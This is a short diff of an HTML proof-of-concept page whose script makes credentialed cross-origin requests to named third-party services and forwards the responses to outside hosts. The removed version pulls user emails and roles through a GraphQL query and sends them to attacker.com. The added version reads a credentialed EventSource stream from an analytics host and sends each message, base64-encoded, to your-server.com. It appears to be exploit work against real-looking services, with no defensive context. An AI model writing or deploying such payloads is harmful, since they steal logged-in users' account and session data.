@@ -2,13 +2,14 @@
 <body>
 
 <script>
-fetch("https://secopsh1.signalsclinical-qa.revvitycloud.net/graphql?query={userInfo{email roles}}", {
-  credentials: "include"
-})
-.then(r => r.text())
-.then(data => {
-  fetch("https://attacker.com/log?d=" + encodeURIComponent(data));
-});
+const es = new EventSource(
+  "https://app.amplitude.com/t/agents/stream/org-url/tuntun/session/e5dbbf5e-0c7a-496b-ab05-cc86448de893?lastId=1773803603221-0",
+  { withCredentials: true }
+);
+
+es.onmessage = (e) => {
+  fetch("https://your-server.com/log?d=" + btoa(e.data));
+};
 </script>
   
 </body>
